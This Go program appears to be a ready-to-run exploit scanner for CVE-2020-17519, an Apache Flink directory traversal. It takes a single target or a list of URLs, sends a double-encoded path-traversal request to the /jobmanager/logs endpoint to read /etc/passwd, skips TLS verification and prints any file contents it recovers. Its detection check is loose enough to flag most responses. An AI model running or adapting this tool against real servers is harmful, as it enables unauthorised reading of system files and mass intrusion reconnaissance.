package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

var list  = []string{}

func main()  {
	Payload := "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
	var url,file string
	flag.StringVar(&url,"u","","输入目标地址")
	flag.StringVar(&file,"f","","输入地址列表文件（*.txt）")
	flag.Parse()
	if url != "" && file == "" {
		result,Status := Launch(url+Payload)
		if  strings.ContainsAny(result,"root | bin | sys | sync | games | man | mail | news | www-data | uucp | backup | list | proxy | gnats | nobody | syslog | apache") && Status == 200 {
			fmt.Printf("[+]%s存在Apache Flink 目录遍历漏洞（CVE-2020-17519：通过REST API读取远程文件）\n\n%s",url,result)
		}else {
			fmt.Printf("[-]%s不存在此漏洞\n",url)
		}
	} else if url =="" && file != "" {
		LoadFile(file)
		//遍历数组
		for _,url:=range list{
			result,Status := Launch(url+Payload)
			if  strings.ContainsAny(result,"root | bin | sys | sync | games | man | mail | news | www-data | uucp | backup | list | proxy | gnats | nobody | syslog | apache") && Status == 200 {
				fmt.Printf("[+]%s存在Apache Flink 目录遍历漏洞（CVE-2020-17519：通过REST API读取远程文件）\n\n%s",url,result)
			}else {
				fmt.Printf("[-]%s不存在此漏洞\n",url)
			}
		}
	} else if url != "" && file != "" {
		panic("命令错误，请通过 “-h” 了解详细参数。")
	}
}

func LoadFile(file string)  {
	fi,err := os.Open(file)
	if err!=nil {
		fmt.Println(err)
		return
	}
	defer fi.Close()
	br := bufio.NewReader(fi)
	for  {
		url,_,err :=br.ReadLine()
		if err == io.EOF {
			break
		}
		if string(url) != "" {
			list = append(list,string(url))
		}
	}
}

func Launch(target string)(string,int)  {
	tr :=&http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	Http := &http.Client{Transport: tr}
	resp,err :=Http.Get(target)
	if err != nil {
		fmt.Println(err)
	}
	StatusCode := resp.StatusCode
	defer resp.Body.Close()
	body,err := ioutil.ReadAll(resp.Body)
	result := string(body)
	return result,StatusCode
}